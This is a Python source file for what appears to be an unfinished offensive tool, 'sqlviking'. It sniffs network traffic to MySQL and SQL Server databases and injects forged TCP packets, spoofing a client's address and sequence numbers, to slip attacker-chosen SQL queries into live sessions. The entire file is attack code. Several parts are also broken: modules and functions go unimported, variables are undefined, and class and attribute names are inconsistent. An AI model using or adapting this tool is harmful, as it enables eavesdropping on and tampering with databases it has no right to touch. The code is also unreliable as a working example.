from os import walk
from operator import itemgetter
from Queue import Queue
import sys, getopt, re, argparse,threading
sys.path.append("databases/")
from constantvalues import *
import mysql,sqlserver

dbQueue1 = Queue()
dbQueue2 = Queue()
injectionQueue = Queue()
pktQueue = Queue()

debug = True

class Conn():
    def __init__(self,cip,cport,sip,sport,state,db,nextcseq=-1,nextsseq=-1):
        self.cip      = cip
        self.cport    = cport
        self.sip      = sip
        self.sport    = sport
        self.db       = db
        self.traffic  = []
        self.frag     = []
        self.state    = state
        self.nextcseq = nextcseq
        self.nextsseq = nextsseq

class Database():
    def __init__(self,dbType,ip,port):
        self.ip       = ip
        self.port     = port
        self.dbType   = dbType
        self.traffic  = []
        self.users    = []
        self.hashes   = []
        self.schemas  = []

    def getHumanType(self):
        return self.dbType
        #dprint(self.dbType)
        #if ISMYSQL(self.dbType):
        #    return 'MySQL'
        #elif ISSQLSERV(self.dbType):
        #    return 'SQL Server'
        #else:
        #    return 'Unknown'

    def addUser(self,u):
        if u not in self.users:
            self.users.append(u)

    def status(self):
        return None

class Traffic():
    def __init__(self,query=None,result=None):
        self.query = query
        self.result = result
        self.timestamp = datetime.datetime.now()

#store table specific info such as columns and associated attributes
class Table():
    def __init__(self,name,db):
        return

class Scout(thread.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.knownDatabases = []
        self.die = False

    def run(self):
        while not self.die:
            while not dbQueue2.empty():
                self.knownDatabases.append(dbQueue2.get())
            try:
                sniff(prn=lambda x: self.putPkt,filter="tcp",store=0,timeout=5)
            except:
                print sys.exc_info()[1]
                self.die = True

    def putPkt(self,pkt):
        for db in self.knownDatabases:
            if (pkt[Ether].src == db.ip and pkt[TCP].sport == db.sport) or (pkt[Ether].dst == db.ip and pkt[TCP].dport == db.port):
                pktQueue.put(pkt)

class Parse(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.die = False
        self.toInject = []
        self.knownDatabases = []
        self.knownConns = []

    def run(self):
        while not self.die:
            while not dbQueue1.empty():
                self.knownDatabases.append(dbQueue1.get())
            while not injectionQueue.empty():
                self.toInject.append(injectionQueue.get())
            if not pktQueue.empty():
                self.handle(pktQueue.get())

    def getConn(self,pkt):
        for p in self.knownConns:
            if p.cip == pkt[Ether].src and p.sip == pkt[Ether].dst and p.sport == pkt[TCP].sport and p.cport == pkt[TCP].dport:
                return p #is req
            elif p.cip == pkt[Ether].dst and p.sip == pkt[Ether].src and p.sport == pkt[TCP].dport and p.cport == pkt[TCP].sport:
                return p #is resp

    def handle(self,pkt):
        #even with TCP filter set on scapy, will occassionally get packets
        #with no TCP layer. throws exception and breaks thread.
        pkts = []
        try:
            pkt[TCP]
        except:
            return

        c  = self.getConn(pkt)

        #check if injection should be performed
        if c:
            for i in self.inject:
                self.printLn("[1] %s %s %s %s %s %s"%(c.db.ip,i[1],c.db.port,i[2],pkt[TCP].sport,pkt[TCP].flags))
                if c.db.ip == i[1] and c.db.port == i[2] and pkt[TCP].sport == i[2] and pkt[TCP].flags == 24: #make sure injecting after db response and it isn't a fragged response
                    self.printLn("[2] attempting injection")
                    #self.printLn(databaseList[c.db.dbType].encodeQuery(i[0]).encode('hex'))
                    #sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=16,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload)))
                    sendp(Ether(dst=pkt[Ether].src,src=pkt[Ether].dst)/IP(dst=i[1],src=c.cip)/TCP(sport=c.cport,dport=i[2],flags=24,seq=c.nextcseq,ack=pkt[TCP].seq+len(pkt[TCP].payload))/databaseList[c.db.dbType].encodeQuery(i[0]))
                    self.inject.remove(i)

        #check if pkt is with knowndb, only need in fingerprint mode
        #db = self.isKnownDB(pkt)
        
        #if c and c.db == UNKNOWN:
        #    c.db = db

        #check for control packets
        if c and pkt[TCP].flags == 17: #FIN/ACK pkt
            self.delConn(c)
            return
        elif pkt[TCP].flags == 2 and not c: #SYN pkt
            #more fingerpringing logic
            #if db
            #    c = self.addConn(pkt,db,state=HANDSHAKE)
            #else:
            c = self.addConn(pkt)
            c.nextcseq = pkt[TCP].seq+1
            return
        
        #empty pkt, no reason to parse. scapy sometimes returns empty pkts with [tcp].payload of several '0' values
        if len(pkt[TCP].payload) == 0 or (len(pkt[TCP].payload) <= 16 and str(pkt[TCP].payload).encode('hex') == '00'*len(pkt[TCP].payload)): 
            return

        #more fingerprint stuff
        #if not c: #check if conn is being made to a known DB
            #db = self.isKnownDB(pkt)
        #    if db:
                #self.printLn("[*] connecting to known db")
        #        c = self.addConn(pkt,db)
            #else:
                #self.printLn("[*] connecting to unknown server")

        ip, port, dbType = None, None, None

        #if not c or c.db == UNKNOWN:
        if not c:
            #pktType = self.fingerprint(str(pkt[TCP].payload))
            if ISRESP(pktType):
                ip = pkt[IP].src
                port = pkt[TCP].sport
            elif ISREQ(pktType):
                ip = pkt[IP].dst
                port = pkt[TCP].dport

            if ISMYSQL(pktType):
                dbType = MYSQL
            elif ISSQLSERV(pktType):
                dbType = SQLSERV

            if ip and port and dbType:
                db = DataBase(ip=ip,port=port,dbType=dbType)
                self.knownDBs.append(db)
                if not c:
                    c = self.addConn(pkt,db)
                else:
                    c.db = db
        
        if c:
            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport and c.nextcseq != -1 and c.nextcseq != pkt[TCP].seq: #is a bad req
                return
            elif pkt[IP].dst == c.cip and pkt[TCP].dport == c.cport and c.nextsseq != -1 and c.nextsseq != pkt[TCP].seq: #is a bad resp
                return

            if (pkt[TCP].flags >> 3) % 2 == 0: #PSH flag not set, is a fragged pkt. this breaks on data sent over lo interface. scapy does not seem to handle len(pkt)>MTU well. 
                c.frag.append(pkt)
            else:
                if len(c.frag) > 0:
                    for p in c.frag:
                        pkts.append(p)
                    c.frag = []
                pkts.append(pkt)
                if c.db != UNKNOWN:
                    self.parse(pkts,c)

            if pkt[IP].src == c.cip and pkt[TCP].sport == c.cport:
                c.nextcseq = len(pkt[TCP].payload)+pkt[TCP].seq
            else:
                c.nextsseq = len(pkt[TCP].payload)+pkt[TCP].seq

def dprint(s):
    global debug
    if debug:
        print(s)

def parseConfig(f):
    global dbs,toInject
    DATABASES = 0
    INJECTION = 1
    DATA = 2
    MISC = 3

    flag = -1
    with open(f,'r') as f:
        for l in f:
            l = l.strip()
            if len(l) == 0 or l[0] == '#':
                continue #donothing
            elif '[Databases]' in l:
                flag = DATABASES
            elif '[Injection]' in l:
                flag = INJECTION
            elif '[Data]' in l:
                flag = DATA
            elif '[Misc]' in l:
                flag = MISC
            elif flag == DATABASES:
                l = l.split(':')
                #dprint('[?] Parsing line for db info:\t%s'%l)
                dbQueue1.put(Database(l[0],l[1],l[2]))
                dbQueue2.put(Database(l[0],l[1],l[2]))
            elif flag == INJECTION:
                injectionQueue.put(l)
            elif flag == DATA:
                l = l #do nothing for know, leave check so i remember to update later when stuff is actually implemented
            elif flag == MISC:
                l = l #do nothing for know, leave check so i remember to update later when stuff is actually implemented

def main():
    parser = argparse.ArgumentParser(description='Own the network, own the database', prog='sqlviking.py', usage='%(prog)s [-v] -c <config file location>', formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=65, width =150))
    parser.add_argument('-v', '--verbose', action='store_true', help='Turn on verbose mode; will print out all captured traffic')
    parser.add_argument('-c', '--configfile', default='sqlviking.conf', help='Config file location, defaults to sqlviking.conf')
    args = parser.parse_args()

    try:
        parseConfig(args.configfile)
    except IOError:
        print('[!] Error reading config file. Exiting...')
        sys.exit(0)

    t1 = Scout()
    #t2 = Parse()
    t1.start()
    #t2.start()

    #printMainMenu(t2)
    try:
        while True:
            a = 1
        #nonBlockingRawInput(t2)
    except KeyboardInterrupt:
        print('\n[!] Shutting down...')
        t1.die = True
        #t2.die = True
    except:
        t1.die = True
        #t2.die = True
        print sys.exc_info()[1]

if __name__ == "__main__":
    main()
